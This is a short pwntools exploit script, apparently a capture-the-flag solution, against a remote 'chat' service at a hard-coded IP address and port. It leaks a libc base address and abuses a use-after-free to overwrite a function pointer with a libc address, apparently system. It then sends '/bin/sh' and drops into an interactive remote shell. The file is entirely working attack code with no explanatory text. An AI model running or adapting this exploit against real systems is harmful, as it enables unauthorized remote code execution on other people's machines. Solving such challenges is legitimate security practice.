from pwn import *


#r = process(["./chat"],env={"LD_PRELOAD":"./libc-2.27.so"})
r = remote("106.52.252.82", 20005)
r.recvuntil("name: ")
context.arch = "amd64"

data = flat(0x0,0x21,0,0,0,0x21,0,0,0,0x21)

r.sendline("AAAA".ljust(0x10,'\x00')+data)


r.recvuntil("help\n==========================================\n")
time.sleep(0.1)
r.send("enter " + "D"*0x30)
time.sleep(0.1)

import struct

val =  struct.pack("<q",-0x21a350)+"\x00"
r.send("say "+val)
r.recvuntil("AAAA: ")
r.sendline("")
r.recvuntil("AAAA: ")
libc = u64(r.recvline()[:-1].ljust(8,'\x00'))- 0x3ebca0

print hex(libc)


val =  struct.pack("<q",-0x21a350)+"\x00"
r.send("say "+val)

val =  struct.pack("<q",-0x215010)
time.sleep(0.1)
r.send("modify " + val*4+p64(0x603140+0x20)[:-1])  # <= name ptr   UAF
time.sleep(0.1)
r.send("modify " + "A"*0x50)
time.sleep(0.1)
r.sendline("")
time.sleep(0.1)
r.sendline("")
time.sleep(0.1)
r.send("modify " + p64(0x0603058))

time.sleep(0.1)
r.send("say AAAA")
time.sleep(0.1)
r.send("say "+p64(libc+0x4f440)[:-1])
time.sleep(0.1)
r.send("/bin/sh\x00")
r.interactive()
